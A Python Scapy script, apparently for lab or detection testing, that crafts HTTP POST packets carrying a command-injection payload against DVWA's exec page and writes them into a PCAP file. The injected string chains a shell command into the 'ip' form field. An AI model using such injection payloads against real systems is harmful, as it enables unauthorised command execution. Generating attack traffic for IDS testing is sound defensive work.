from scapy.all import *
from scapy.layers.http import HTTPRequest, HTTPResponse

# 기존 패킷 정보
src_mac = "50:eb:f6:b6:9d:95"
dst_mac = "00:07:70:f7:2e:ae"
src_ip = "192.168.137.13"
dst_ip = "192.168.137.147"
src_port_start = 50000  # 시작 소스 포트
dst_port = 80  # HTTP 포트
seq_num = 3221456082
ack_num = 797427787

# 악성 명령어를 포함한 POST 데이터
malicious_command = "uname -a; /bin/bash -c 'echo hacked > /tmp/hacked';"

# 패킷 생성 함수
def create_http_post_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq_num, ack_num, command):
    ether = Ether(src=src_mac, dst=dst_mac)
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=src_port, dport=dst_port, seq=seq_num, ack=ack_num, flags="PA")
    http_req = HTTPRequest(
        Method=b"POST",
        Path=b"/dvwa/vulnerabilities/exec/",
        Http_Version=b"HTTP/1.1",
        Host=b"192.168.137.13",
        User_Agent=b"Scapy Command Injection",
        Connection=b"keep-alive",
        Content_Type=b"application/x-www-form-urlencoded",
        Content_Length=b"100"
    )
    post_data = f"ip={command}&submit=Submit".encode()
    packet = ether / ip / tcp / http_req / post_data
    return packet

# 기존 PCAP 파일 읽기
original_pcap = 'C:/Users/whdwns/Desktop/eqw.pcap'  # 파일 경로 수정
packets = rdpcap(original_pcap)

# Command Injection 패킷 생성 및 추가
num_injection_packets = 10  # 생성할 Command Injection 패킷의 수
for i in range(num_injection_packets):
    src_port = src_port_start + i  # 각 패킷마다 소스 포트 변경
    injection_packet = create_http_post_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq_num + i, ack_num, malicious_command)
    packets.append(injection_packet)
    time.sleep(0.01)  # 패킷 전송 간격을 10ms로 설정

# 새로운 PCAP 파일로 저장
output_pcap = 'C:/Users/whdwns/Desktop/output_with_command_injection.pcap'  # 파일 경로 수정
wrpcap(output_pcap, packets)

print(f"Command Injection 패킷이 추가된 새로운 PCAP 파일이 '{output_pcap}'에 저장되었습니다.")
